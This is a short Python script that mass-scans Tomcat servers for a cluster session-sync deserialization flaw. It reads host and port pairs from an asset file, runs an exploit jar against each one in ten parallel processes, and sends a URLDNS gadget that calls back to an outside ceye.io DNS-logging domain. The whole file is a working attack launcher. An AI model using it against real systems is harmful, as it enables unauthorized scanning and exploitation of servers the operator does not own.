#!/usr/bin/python
# -*- coding:utf-8 -*-
from concurrent.futures import ProcessPoolExecutor
import os

pool = ProcessPoolExecutor(10)


def open_file(filename):
    websites = open(filename,"r",encoding='utf-8',errors='ignore')
    for url in websites:
        if "http" in url:
            continue
        else:
            url = url.strip()
            host,port = url.split(" ")[0],url.split(" ")[1]
            pool.submit(poc,host,port)

def main():
    filename = input("待扫描的资产文件(e.g url.txt)：")
    open_file(filename)

def poc(ip,port):
    cmd = 'java -jar tomcat-cluster-session-sync-exp-1.0-SNAPSHOT-jar-with-dependencies.jar {ipaddress} {port} URLDNS "http://{ip_port}.xxxx.ceye.io"'.format(ipaddress=ip,port=port,ip_port=ip+"-"+port)
    print(cmd)
    os.system(cmd)


if __name__ == '__main__':
    main()

